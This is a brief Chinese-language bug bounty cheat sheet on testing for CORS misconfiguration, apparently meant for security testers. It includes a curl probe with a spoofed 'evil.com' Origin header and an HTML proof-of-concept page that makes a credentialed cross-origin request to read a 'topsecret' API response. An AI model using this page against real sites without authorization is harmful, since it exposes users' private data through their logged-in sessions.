## 跨域资产共享 (CORS)

测试:
`curl --head -s 'http://example.com/api/v1/secret' -H 'Origin: http://evil.com'`

检查服务器返回是否有 `Access-Control-Allow-Origin:`，如果有检查`Access-Control-Allow-Credentials: true`是否存在。

如果它信任任意来源**并且** allow-credentials设置为true，那么将此HTML作为概念证明。

```
<!DOCTYPE html>
<html>
<head><title>BugBounty CheatSheet</title></head>
<body>
<center>
<h2>CORs POC</h2>

<textarea rows="10" cols="60" id="pwnz">
</textarea><br>
<button type="button" onclick="cors()">Exploit</button>
</div>

<script>
function cors() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      document.getElementById("pwnz").innerHTML = this.responseText;
    }
  };
  xhttp.open("GET", "http://example.com/api/v1/topsecret", true);
  xhttp.withCredentials = true;
  xhttp.send();
}
</script>
```

